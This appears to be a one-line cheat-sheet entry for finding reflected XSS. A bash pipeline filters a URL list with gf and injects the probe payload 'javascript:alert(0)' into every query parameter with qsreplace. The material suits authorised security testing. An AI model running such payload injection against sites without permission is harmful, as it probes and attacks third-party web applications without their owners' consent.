Reflect XSS

```bash
cat urls.txt | gf xss | qsreplace -a 'javascript:alert(0)'

```
